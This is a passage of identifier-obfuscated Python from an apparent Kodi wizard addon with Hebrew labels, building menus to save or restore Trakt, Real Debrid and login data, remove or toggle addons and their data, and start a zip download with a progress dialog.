	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0O00O0OOO0O00000 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0OO000OO0OOOOO0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת פליליסט לאודר:  '%O0OOO00O0O000OOO0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת הגדרות באפר: '%O0OO0O000OOOOO000 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת רשימות ריפו:  '%OOO00O0OOOO0000OO .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3144
	setView ('files','viewType')#line:3146
def traktMenu ():#line:3148
	O000O0OO00OOO00OO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3149
	OOOO00O0000O0OOOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3150
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3151
	addFile ('Save Trakt Data: %s'%O000O0OO00OOO00OO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3152
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOO00O0000O0OOOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3153
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3154
	for O000O0OO00OOO00OO in traktit .ORDER :#line:3156
		O00000O0O00OOOO00 =TRAKTID [O000O0OO00OOO00OO ]['name']#line:3157
		O0O0OOO000OO0000O =TRAKTID [O000O0OO00OOO00OO ]['path']#line:3158
		OO000O00OO0OO000O =TRAKTID [O000O0OO00OOO00OO ]['saved']#line:3159
		OOO00OO00OO00O0OO =TRAKTID [O000O0OO00OOO00OO ]['file']#line:3160
		OOOOOOOOO0OOOOO00 =wiz .getS (OO000O00OO0OO000O )#line:3161
		O0O0O00O0O0OOOOOO =traktit .traktUser (O000O0OO00OOO00OO )#line:3162
		OO0OOOO0OO00000OO =TRAKTID [O000O0OO00OOO00OO ]['icon']if os .path .exists (O0O0OOO000OO0000O )else ICONTRAKT #line:3163
		O0000OOO0OO0OO00O =TRAKTID [O000O0OO00OOO00OO ]['fanart']if os .path .exists (O0O0OOO000OO0000O )else FANART #line:3164
		OOO0O0O0000OO00O0 =createMenu ('saveaddon','Trakt',O000O0OO00OOO00OO )#line:3165
		OOO00OO0OO0OO0O0O =createMenu ('save','Trakt',O000O0OO00OOO00OO )#line:3166
		OOO0O0O0000OO00O0 .append ((THEME2 %'%s Settings'%O00000O0O00OOOO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000O0OO00OOO00OO )))#line:3167
		addFile ('[+]-> %s'%O00000O0O00OOOO00 ,'',icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,themeit =THEME3 )#line:3169
		if not os .path .exists (O0O0OOO000OO0000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO0O0O0000OO00O0 )#line:3170
		elif not O0O0O00O0O0OOOOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000O0OO00OOO00OO ,icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO0O0O0000OO00O0 )#line:3171
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O0O00O0O0OOOOOO ,'authtrakt',O000O0OO00OOO00OO ,icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO0O0O0000OO00O0 )#line:3172
		if OOOOOOOOO0OOOOO00 =="":#line:3173
			if os .path .exists (OOO00OO00OO00O0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000O0OO00OOO00OO ,icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO00OO0OO0OO0O0O )#line:3174
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000O0OO00OOO00OO ,icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO00OO0OO0OO0O0O )#line:3175
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOOOOOOOO0OOOOO00 ,'',icon =OO0OOOO0OO00000OO ,fanart =O0000OOO0OO0OO00O ,menu =OOO00OO0OO0OO0O0O )#line:3176
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3178
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	setView ('files','viewType')#line:3184
def realMenu ():#line:3186
	OOO0OO0O0O0O0OOOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3187
	OO0OOO0O0O0O00OO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3188
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3189
	addFile ('Save Real Debrid Data: %s'%OOO0OO0O0O0O0OOOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3190
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO0OOO0O0O0O00OO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3191
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3192
	for OO00O00OOO0O00OOO in debridit .ORDER :#line:3194
		O0O0000O0000O0OOO =DEBRIDID [OO00O00OOO0O00OOO ]['name']#line:3195
		OOO0OOO0OOO0O0OOO =DEBRIDID [OO00O00OOO0O00OOO ]['path']#line:3196
		O00OO0O0OO00OO0O0 =DEBRIDID [OO00O00OOO0O00OOO ]['saved']#line:3197
		O0OOO0O000OOOO0OO =DEBRIDID [OO00O00OOO0O00OOO ]['file']#line:3198
		OOO000OOO0O0000OO =wiz .getS (O00OO0O0OO00OO0O0 )#line:3199
		O00OOO00O0O00OOOO =debridit .debridUser (OO00O00OOO0O00OOO )#line:3200
		OO0O000OO0O0O0O00 =DEBRIDID [OO00O00OOO0O00OOO ]['icon']if os .path .exists (OOO0OOO0OOO0O0OOO )else ICONREAL #line:3201
		OO000OOO00OOO00OO =DEBRIDID [OO00O00OOO0O00OOO ]['fanart']if os .path .exists (OOO0OOO0OOO0O0OOO )else FANART #line:3202
		OO00O000OO00O0O00 =createMenu ('saveaddon','Debrid',OO00O00OOO0O00OOO )#line:3203
		O000OOOO0000OOOOO =createMenu ('save','Debrid',OO00O00OOO0O00OOO )#line:3204
		OO00O000OO00O0O00 .append ((THEME2 %'%s Settings'%O0O0000O0000O0OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OO00O00OOO0O00OOO )))#line:3205
		addFile ('[+]-> %s'%O0O0000O0000O0OOO ,'',icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,themeit =THEME3 )#line:3207
		if not os .path .exists (OOO0OOO0OOO0O0OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =OO00O000OO00O0O00 )#line:3208
		elif not O00OOO00O0O00OOOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OO00O00OOO0O00OOO ,icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =OO00O000OO00O0O00 )#line:3209
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOO00O0O00OOOO ,'authdebrid',OO00O00OOO0O00OOO ,icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =OO00O000OO00O0O00 )#line:3210
		if OOO000OOO0O0000OO =="":#line:3211
			if os .path .exists (O0OOO0O000OOOO0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OO00O00OOO0O00OOO ,icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =O000OOOO0000OOOOO )#line:3212
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OO00O00OOO0O00OOO ,icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =O000OOOO0000OOOOO )#line:3213
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000OOO0O0000OO ,'',icon =OO0O000OO0O0O0O00 ,fanart =OO000OOO00OOO00OO ,menu =O000OOOO0000OOOOO )#line:3214
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3216
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3217
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3218
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3219
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3220
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3221
	setView ('files','viewType')#line:3222
def loginMenu ():#line:3224
	O0O0000OOOOOOOO00 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3225
	OOOO000OOOOO00O00 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3226
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3227
	addFile ('Save Login Data: %s'%O0O0000OOOOOOOO00 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3228
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOO000OOOOO00O00 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3229
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3230
	for O0O0000OOOOOOOO00 in loginit .ORDER :#line:3232
		OOO000OO00OO00O0O =LOGINID [O0O0000OOOOOOOO00 ]['name']#line:3233
		O000O00OOO0O0OOOO =LOGINID [O0O0000OOOOOOOO00 ]['path']#line:3234
		O0O00OO0O0O00O0O0 =LOGINID [O0O0000OOOOOOOO00 ]['saved']#line:3235
		OOOO0000OOO00000O =LOGINID [O0O0000OOOOOOOO00 ]['file']#line:3236
		O00O000O0OO00O0OO =wiz .getS (O0O00OO0O0O00O0O0 )#line:3237
		O00OOOOOO00OO0OO0 =loginit .loginUser (O0O0000OOOOOOOO00 )#line:3238
		OOOO00O00O00OO0OO =LOGINID [O0O0000OOOOOOOO00 ]['icon']if os .path .exists (O000O00OOO0O0OOOO )else ICONLOGIN #line:3239
		OOOO000O0OOO00O0O =LOGINID [O0O0000OOOOOOOO00 ]['fanart']if os .path .exists (O000O00OOO0O0OOOO )else FANART #line:3240
		OO0O00O0OO0OO0O00 =createMenu ('saveaddon','Login',O0O0000OOOOOOOO00 )#line:3241
		OO0O000OO0O0O00O0 =createMenu ('save','Login',O0O0000OOOOOOOO00 )#line:3242
		OO0O00O0OO0OO0O00 .append ((THEME2 %'%s Settings'%OOO000OO00OO00O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O0O0000OOOOOOOO00 )))#line:3243
		addFile ('[+]-> %s'%OOO000OO00OO00O0O ,'',icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,themeit =THEME3 )#line:3245
		if not os .path .exists (O000O00OOO0O0OOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O00O0OO0OO0O00 )#line:3246
		elif not O00OOOOOO00OO0OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O0O0000OOOOOOOO00 ,icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O00O0OO0OO0O00 )#line:3247
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00OOOOOO00OO0OO0 ,'authlogin',O0O0000OOOOOOOO00 ,icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O00O0OO0OO0O00 )#line:3248
		if O00O000O0OO00O0OO =="":#line:3249
			if os .path .exists (OOOO0000OOO00000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O0O0000OOOOOOOO00 ,icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O000OO0O0O00O0 )#line:3250
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O0O0000OOOOOOOO00 ,icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O000OO0O0O00O0 )#line:3251
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O000O0OO00O0OO ,'',icon =OOOO00O00O00OO0OO ,fanart =OOOO000O0OOO00O0O ,menu =OO0O000OO0O0O00O0 )#line:3252
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3254
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	setView ('files','viewType')#line:3260
def fixUpdate ():#line:3262
	if KODIV <17 :#line:3263
		OOOOO0000O00O0OOO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3264
		try :#line:3265
			os .remove (OOOOO0000O00O0OOO )#line:3266
		except Exception as O00O0OOO00O00O0O0 :#line:3267
			wiz .log ("Unable to remove %s, Purging DB"%OOOOO0000O00O0OOO )#line:3268
			wiz .purgeDb (OOOOO0000O00O0OOO )#line:3269
	else :#line:3270
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3271
def removeAddonMenu ():#line:3273
	OOO0O0OO0000O0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3274
	O0OOOOO0OO0O0O00O =[];O0O00OOOO0O0OO0OO =[]#line:3275
	for OO0000O0OOO00OOOO in sorted (OOO0O0OO0000O0OOO ,key =lambda O0000OOOO0000OO00 :O0000OOOO0000OO00 ):#line:3276
		OOOOO00O0OO0OOOO0 =os .path .split (OO0000O0OOO00OOOO [:-1 ])[1 ]#line:3277
		if OOOOO00O0OO0OOOO0 in EXCLUDES :continue #line:3278
		elif OOOOO00O0OO0OOOO0 in DEFAULTPLUGINS :continue #line:3279
		elif OOOOO00O0OO0OOOO0 =='packages':continue #line:3280
		OOO0OO00OO00000OO =os .path .join (OO0000O0OOO00OOOO ,'addon.xml')#line:3281
		if os .path .exists (OOO0OO00OO00000OO ):#line:3282
			O0OOOO00O00O00OO0 =open (OOO0OO00OO00000OO )#line:3283
			OOOOOO000O0O00O00 =O0OOOO00O00O00OO0 .read ()#line:3284
			OOOOOO0O000OO000O =wiz .parseDOM (OOOOOO000O0O00O00 ,'addon',ret ='id')#line:3285
			O00O000O0OOOO0O00 =OOOOO00O0OO0OOOO0 if len (OOOOOO0O000OO000O )==0 else OOOOOO0O000OO000O [0 ]#line:3287
			try :#line:3288
				O00OO0OO00OOOO0O0 =xbmcaddon .Addon (id =O00O000O0OOOO0O00 )#line:3289
				O0OOOOO0OO0O0O00O .append (O00OO0OO00OOOO0O0 .getAddonInfo ('name'))#line:3290
				O0O00OOOO0O0OO0OO .append (O00O000O0OOOO0O00 )#line:3291
			except :#line:3292
				pass #line:3293
	if len (O0OOOOO0OO0O0O00O )==0 :#line:3294
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3295
		return #line:3296
	if KODIV >16 :#line:3297
		O0OO0000OO0OOOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OOOOO0OO0O0O00O )#line:3298
	else :#line:3299
		O0OO0000OO0OOOO0O =[];OOO0O00OOO000OOOO =0 #line:3300
		OO0O0O00O0O00O00O =["-- Click here to Continue --"]+O0OOOOO0OO0O0O00O #line:3301
		while not OOO0O00OOO000OOOO ==-1 :#line:3302
			OOO0O00OOO000OOOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O0O00O0O00O00O )#line:3303
			if OOO0O00OOO000OOOO ==-1 :break #line:3304
			elif OOO0O00OOO000OOOO ==0 :break #line:3305
			else :#line:3306
				OO00O0OOO00OOOOOO =(OOO0O00OOO000OOOO -1 )#line:3307
				if OO00O0OOO00OOOOOO in O0OO0000OO0OOOO0O :#line:3308
					O0OO0000OO0OOOO0O .remove (OO00O0OOO00OOOOOO )#line:3309
					OO0O0O00O0O00O00O [OOO0O00OOO000OOOO ]=O0OOOOO0OO0O0O00O [OO00O0OOO00OOOOOO ]#line:3310
				else :#line:3311
					O0OO0000OO0OOOO0O .append (OO00O0OOO00OOOOOO )#line:3312
					OO0O0O00O0O00O00O [OOO0O00OOO000OOOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O0OOOOO0OO0O0O00O [OO00O0OOO00OOOOOO ])#line:3313
	if O0OO0000OO0OOOO0O ==None :return #line:3314
	if len (O0OO0000OO0OOOO0O )>0 :#line:3315
		wiz .addonUpdates ('set')#line:3316
		for O0OO0O0O00OO00O0O in O0OO0000OO0OOOO0O :#line:3317
			removeAddon (O0O00OOOO0O0OO0OO [O0OO0O0O00OO00O0O ],O0OOOOO0OO0O0O00O [O0OO0O0O00OO00O0O ],True )#line:3318
		xbmc .sleep (1000 )#line:3320
		if INSTALLMETHOD ==1 :OO0OOO0OOOOO000OO =1 #line:3322
		elif INSTALLMETHOD ==2 :OO0OOO0OOOOO000OO =0 #line:3323
		else :OO0OOO0OOOOO000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3324
		if OO0OOO0OOOOO000OO ==1 :wiz .reloadFix ('remove addon')#line:3325
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3326
def removeAddonDataMenu ():#line:3328
	if os .path .exists (ADDOND ):#line:3329
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3330
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3331
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3332
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3333
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3334
		OO00OO0OO0OOO0O00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3335
		for OO0OO000O0OO00O00 in sorted (OO00OO0OO0OOO0O00 ,key =lambda O00OOO0000000O000 :O00OOO0000000O000 ):#line:3336
			O00OO00OOO0OOO00O =OO0OO000O0OO00O00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3337
			OO000O00O0O0OOOO0 =os .path .join (OO0OO000O0OO00O00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3338
			OOOO0OOOOOOOO0OO0 =os .path .join (OO0OO000O0OO00O00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3339
			O0O0O0OO000OOO000 =O00OO00OOO0OOO00O #line:3340
			OO0O00O0OOOO000O0 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3341
			for O00O0O00OO000OOO0 in OO0O00O0OOOO000O0 :#line:3342
				O0O0O0OO000OOO000 =O0O0O0OO000OOO000 .replace (O00O0O00OO000OOO0 ,OO0O00O0OOOO000O0 [O00O0O00OO000OOO0 ])#line:3343
			if O00OO00OOO0OOO00O in EXCLUDES :O0O0O0OO000OOO000 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O0O0OO000OOO000 #line:3344
			else :O0O0O0OO000OOO000 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O0O0OO000OOO000 #line:3345
			addFile (' %s'%O0O0O0OO000OOO000 ,'removedata',O00OO00OOO0OOO00O ,icon =OO000O00O0O0OOOO0 ,fanart =OOOO0OOOOOOOO0OO0 ,themeit =THEME2 )#line:3346
	else :#line:3347
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3348
	setView ('files','viewType')#line:3349
def enableAddons ():#line:3351
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3352
	OO0O00OOOO000OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3353
	O0O00OOO00O0OO000 =0 #line:3354
	for O0O0OO0O00OO00OO0 in sorted (OO0O00OOOO000OO0O ,key =lambda O000000O0O000O00O :O000000O0O000O00O ):#line:3355
		OO0O00OOO0OO0OOO0 =os .path .split (O0O0OO0O00OO00OO0 [:-1 ])[1 ]#line:3356
		if OO0O00OOO0OO0OOO0 in EXCLUDES :continue #line:3357
		if OO0O00OOO0OO0OOO0 in DEFAULTPLUGINS :continue #line:3358
		OO00OO0O0O00000OO =os .path .join (O0O0OO0O00OO00OO0 ,'addon.xml')#line:3359
		if os .path .exists (OO00OO0O0O00000OO ):#line:3360
			O0O00OOO00O0OO000 +=1 #line:3361
			OO0O00OOOO000OO0O =O0O0OO0O00OO00OO0 .replace (ADDONS ,'')[1 :-1 ]#line:3362
			O0O0O00O0OO0OO000 =open (OO00OO0O0O00000OO )#line:3363
			OOOOO00O0000OOOO0 =O0O0O00O0OO0OO000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3364
			OOO000OOOO000O0O0 =wiz .parseDOM (OOOOO00O0000OOOO0 ,'addon',ret ='id')#line:3365
			OO0O000OOO0000O0O =wiz .parseDOM (OOOOO00O0000OOOO0 ,'addon',ret ='name')#line:3366
			try :#line:3367
				OO0O0OO0000OOO000 =OOO000OOOO000O0O0 [0 ]#line:3368
				O000OO0000O00O0O0 =OO0O000OOO0000O0O [0 ]#line:3369
			except :#line:3370
				continue #line:3371
			try :#line:3372
				OOO0O00O0OO0O0OOO =xbmcaddon .Addon (id =OO0O0OO0000OOO000 )#line:3373
				O000O0O000OOOOOOO ="[COLOR green][Enabled][/COLOR]"#line:3374
				O0O0O0O000OO0O0O0 ="false"#line:3375
			except :#line:3376
				O000O0O000OOOOOOO ="[COLOR red][Disabled][/COLOR]"#line:3377
				O0O0O0O000OO0O0O0 ="true"#line:3378
				pass #line:3379
			O0OO0OO00000OO00O =os .path .join (O0O0OO0O00OO00OO0 ,'icon.png')if os .path .exists (os .path .join (O0O0OO0O00OO00OO0 ,'icon.png'))else ICON #line:3380
			O00O00OO0O0OOO0OO =os .path .join (O0O0OO0O00OO00OO0 ,'fanart.jpg')if os .path .exists (os .path .join (O0O0OO0O00OO00OO0 ,'fanart.jpg'))else FANART #line:3381
			addFile ("%s %s"%(O000O0O000OOOOOOO ,O000OO0000O00O0O0 ),'toggleaddon',OO0O00OOOO000OO0O ,O0O0O0O000OO0O0O0 ,icon =O0OO0OO00000OO00O ,fanart =O00O00OO0O0OOO0OO )#line:3382
			O0O0O00O0OO0OO000 .close ()#line:3383
	if O0O00OOO00O0OO000 ==0 :#line:3384
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3385
	setView ('files','viewType')#line:3386
def changeFeq ():#line:3388
	OOOOO000O00OO0O0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3389
	OOO0OOO00O000OO0O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOOO000O00OO0O0O )#line:3390
	if not OOO0OOO00O000OO0O ==-1 :#line:3391
		wiz .setS ('autocleanfeq',str (OOO0OOO00O000OO0O ))#line:3392
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOOO000O00OO0O0O [OOO0OOO00O000OO0O ]))#line:3393
def developer ():#line:3395
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3396
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3397
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3398
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3399
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3400
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3401
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3402
	setView ('files','viewType')#line:3404
def download (OO0OO00O00O00OOOO ,OOOO0O00O0O0O0OO0 ):#line:3409
  OO00O000O0OOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3410
  OOOOO000OOOOOO00O =xbmcgui .DialogProgress ()#line:3411
  OOOOO000OOOOOO00O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3412
  O00O0OOO0000000OO =os .path .join (OO00O000O0OOO0000 ,'isr.zip')#line:3413
  OO0000O00O0OO00O0 =urllib2 .Request (OO0OO00O00O00OOOO )#line:3414
  OOOO0O0O0O000OOOO =urllib2 .urlopen (OO0000O00O0OO00O0 )#line:3415
  O0O000OO0OOOOOOOO =xbmcgui .DialogProgress ()#line:3417
  O0O000OO0OOOOOOOO .create ("Downloading","Downloading "+name )#line:3418
  O0O000OO0OOOOOOOO .update (0 )#line:3419
  O0OOOOOO00OOOO0OO =OOOO0O00O0O0O0OO0 #line:3420
  OOO00O0O0O000OOOO =open (O00O0OOO0000000OO ,'wb')#line:3421
  try :#line:3423
    OOO0O0O0O000O00OO =OOOO0O0O0O000OOOO .info ().getheader ('Content-Length').strip ()#line:3424
    O000OO000OO00OO0O =True #line:3425
  except AttributeError :#line:3426
        O000OO000OO00OO0O =False #line:3427
  if O000OO000OO00OO0O :#line:3429
        OOO0O0O0O000O00OO =int (OOO0O0O0O000O00OO )#line:3430
  OOOO000O000OO00OO =0 #line:3432
  OOOOOO0O0O0O0O0O0 =time .time ()#line:3433
  while True :#line:3434
        OO0O0000O0OO0O0OO =OOOO0O0O0O000OOOO .read (8192 )#line:3435
        if not OO0O0000O0OO0O0OO :#line:3436
            sys .stdout .write ('\n')#line:3437
            break #line:3438
        OOOO000O000OO00OO +=len (OO0O0000O0OO0O0OO )#line:3440
        OOO00O0O0O000OOOO .write (OO0O0000O0OO0O0OO )#line:3441
        if not O000OO000OO00OO0O :#line:3443
            OOO0O0O0O000O00OO =OOOO000O000OO00OO #line:3444
        if O0O000OO0OOOOOOOO .iscanceled ():#line:3445
           O0O000OO0OOOOOOOO .close ()#line:3446
           try :#line:3447
            os .remove (O00O0OOO0000000OO )#line:3448
           except :#line:3449
            pass #line:3450
           break #line:3451
        O0O00OO000OOOO000 =float (OOOO000O000OO00OO )/OOO0O0O0O000O00OO #line:3452
